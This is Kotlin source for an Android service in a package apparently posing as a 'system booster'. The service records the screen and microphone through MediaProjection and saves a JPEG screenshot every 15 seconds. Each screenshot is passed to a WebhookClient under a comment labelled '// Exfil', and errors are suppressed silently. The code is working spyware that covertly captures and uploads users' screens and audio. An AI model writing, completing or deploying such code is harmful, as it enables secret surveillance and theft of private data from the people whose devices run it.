package com.sysopt.booster

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Surface
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class ScreenCaptureService : Service() {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var imageReader: ImageReader? = null
    private val handler = Handler(Looper.getMainLooper())
    private var isRecording = false
    private var screenshotCount = 0

    companion object {
        private var resultCode: Int = 0
        private var data: Intent? = null

        fun startProjection(context: Context, code: Int, intent: Intent) {
            resultCode = code
            data = intent
            context.startService(Intent(context, ScreenCaptureService::class.java))
        }
    }

    override fun onCreate() {
        super.onCreate()
        startForeground(2002, NotificationHelper.createNotification(this, "Screen Capture Active"))
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (data != null) {
            startScreenCapture()
        }
        return START_STICKY
    }

    private fun startScreenCapture() {
        if (isRecording) return

        try {
            val pm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = pm.getMediaProjection(resultCode, data!!)

            val metrics = resources.displayMetrics
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            // Setup MediaRecorder with optimized settings
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(width, height)
                setVideoFrameRate(24)
                setVideoEncodingBitRate(4 * 1024 * 1024)
                setOutputFile(getVideoFile())
                prepare()
            }

            val surface = mediaRecorder?.surface
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                surface, null, null
            )

            mediaRecorder?.start()
            isRecording = true

            // Start periodic screenshots
            startScreenshotLoop()

        } catch (e: Exception) {
            stopScreenCapture()
        }
    }

    private fun startScreenshotLoop() {
        handler.post(object : Runnable {
            override fun run() {
                if (isRecording) {
                    captureScreenshot()
                    handler.postDelayed(this, 15000) // Every 15 seconds
                }
            }
        })
    }

    private fun captureScreenshot() {
        try {
            val metrics = resources.displayMetrics
            val width = metrics.widthPixels
            val height = metrics.heightPixels

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            val imageSurface = imageReader?.surface

            val display = mediaProjection?.createVirtualDisplay(
                "Screenshot",
                width, height, metrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageSurface, null, null
            )

            val image = imageReader?.acquireLatestImage()
            image?.let {
                val planes = it.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * width

                val bitmap = Bitmap.createBitmap(
                    width + rowPadding / pixelStride,
                    height,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)

                // Save compressed screenshot
                val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES),
                    "scr_${System.currentTimeMillis()}.jpg")
                val fos = java.io.FileOutputStream(file)
                bitmap.compress(Bitmap.CompressFormat.JPEG, 70, fos)
                fos.close()
                bitmap.recycle()

                // Exfil
                WebhookClient.sendFile(file.absolutePath, "screenshot")

                screenshotCount++
                it.close()
            }

            imageReader?.close()
            display?.release()
        } catch (e: Exception) {
            // Silent
        }
    }

    private fun getVideoFile(): String {
        val dir = getExternalFilesDir(Environment.DIRECTORY_MOVIES)
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        return File(dir, "rec_$timestamp.mp4").absolutePath
    }

    private fun stopScreenCapture() {
        isRecording = false
        handler.removeCallbacksAndMessages(null)

        mediaRecorder?.apply {
            try { stop() } catch (e: Exception) {}
            try { release() } catch (e: Exception) {}
        }

        virtualDisplay?.release()
        mediaProjection?.stop()
        imageReader?.close()

        mediaRecorder = null
        virtualDisplay = null
        mediaProjection = null
        imageReader = null
    }

    override fun onDestroy() {
        stopScreenCapture()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}